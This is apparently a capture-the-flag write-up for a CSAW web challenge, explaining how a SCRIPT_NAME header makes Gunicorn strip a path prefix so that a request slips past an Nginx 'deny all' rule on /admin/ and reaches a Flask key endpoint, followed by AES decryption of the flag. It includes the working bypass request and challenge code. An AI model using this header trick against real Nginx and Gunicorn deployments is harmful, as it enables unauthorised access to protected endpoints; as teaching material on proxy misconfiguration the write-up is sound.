---
description: Bypassing Nginx directive through manipulating Gunicorn WSGI variables
---

# Gatekeeping

## Description

My previous flag file got encrypted by some dumb ransomware. They didn't even tell me how to pay them, so I'm totally out of luck. All I have is the site that is supposed to decrypt my files (but obviously that doesn't work either).

Author: `itszn`, Ret2 Systems

http://web.chal.csaw.io:5004

## Solution

When inspecting the provided Nginx configuration, I found an interesting directive:

```
# INFO(brad)
# Thought I would explain this to clear it up:
# When we make a request, nginx forwards the request to gunicorn.
# Gunicorn then reads the request and calculates the path (which is put into the WSGI variable `path_info`)
#
# We can prevent nginx from forwarding any request starting with "/admin/". If we do this 
# there is no way for gunicorn to send flask a `path_info` which starts with "/admin/"
# Thus any flask route starting with /admin/ should be safe :)
location ^~ /admin/ {
    deny all;
}
```

I think "Brad" explained it quite well, but essentially, this disallows all requests with URL paths starting with `/admin/`. Nginx serves as the "front-end" forwarder that passes requests to Gunicorn, which is a WSGI server. Gunicorn is the one that serves the actual Flask application.

Interesting! Looking at the server code revealed a hidden endpoint under `/admin/key`.

```python
# === CL Review Comments - 5a7b3f
# <Alex> Is this safe?
# <Brad> Yes, because we have `deny all` in nginx.
# <Alex> Are you sure there won't be any way to get around it?
# <Brad> Here, I wrote a better description in the nginx config, hopefully that will help
# <Brad> Plus we had our code audited after they stole our coins last time
# <Alex> What about dependencies?
# <Brad> You are over thinking it. no one is going to be looking. everyone we encrypt is so bad at security they would never be able to find a bug in a library like that
# ===
@app.route('/admin/key')
def get_key():
    return jsonify(key=get_info()['key'])
```

Clearly, we had to get to the `/admin/key` endpoint to get the key. But how?

There is another interesting part of the Nginx configuration. When forwarding requests to Gunicorn, the request headers are preserved.

```
proxy_pass http://unix:/tmp/gunicorn.sock;
proxy_pass_request_headers on;
```

I began wondering if HTTP headers could somehow manipulate the processing of the URL path by Gunicorn, and found [this stackoverflow thread](https://stackoverflow.com/questions/63419829/nginx-and-gunicorn-wsgi-variables). 

Apparently, when the `SCRIPT_NAME` WSGI variable is set, the `SCRIPT_NAME` prefix is stripped from `PATH_INFO`. According to the [documentation](https://docs.gunicorn.org/en/stable/faq.html#how-do-i-set-script-name), the `SCRIPT_NAME` can be set through a HTTP header.

![](<../../.gitbook/assets/Screenshot 2021-09-13 at 6.33.45 PM.png>)

Interesting! Consider the following request:

```http
GET /test/admin/key HTTP/1.1

...

SCRIPT_NAME: /test
```

Nginx first receives the request. It checks against the directives specified in the configuration file, and confirms that access is not denied (`/test/admin/key` does not start with `/admin`). The request is now forwarded to Gunicorn.

Gunicorn sees the `SCRIPT_NAME` HTTP header, and hence uses `/test` as the `SCRIPT_NAME` WSGI variable. Gunicorn strips `SCRIPT_NAME` from the  beginning of the URL path, leaving us with `/admin/key`. Therefore, `/admin/key` is the final endpoint that is served by the Flask application.

Great! We have access to the `/admin/key` endpoint. In order to get the decryption key, we have to suppply a `key_id`.

```python
def get_info():
    key = request.headers.get('key_id')
    if not key:
        abort(400, 'Missing key id')
    if not all(c in '0123456789ABCDEFabcdef'
            for c in key):
        abort(400, 'Invalid key id format')
    path = os.path.join('/server/keys',key)
    if not os.path.exists(path):
        abort(401, 'Unknown encryption key id')
    with open(path,'r') as f:
        return json.load(f)
```

Fortunately, the logic for generating the `key_id` is already implemented in the site's JavaScript. Add a line to log the `key_id` to the console:

```javascript
let data = new Uint8Array(evt.target.result);

let key_id = data.slice(0,16);
key_id = buf2hex(key_id);

console.log(key_id)
```

The `key_id` for the flag file is `05d1dc92ce82cc09d9d7ff1ac9d5611d`. 

Using this `key_id`, we can find that the decryption key is `b5082f02fd0b6a06203e0a9ffb8d7613dd7639a67302fc1f357990c49a6541f3`.

![](<../../.gitbook/assets/image (77).png>)

The only thing left to do is to decrypt the file. I modified the `/decrypt` endpoint to do this.

```python
@app.route('/decrypt', methods=['POST'])
def pwn():
    key = binascii.unhexlify('b5082f02fd0b6a06203e0a9ffb8d7613dd7639a67302fc1f357990c49a6541f3')
    data = request.get_data()
    iv = data[:AES.block_size]

    data = data[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CFB, iv)
    return cipher.decrypt(data)
```

The flag is `flag{gunicorn_probably_should_not_do_that}`.
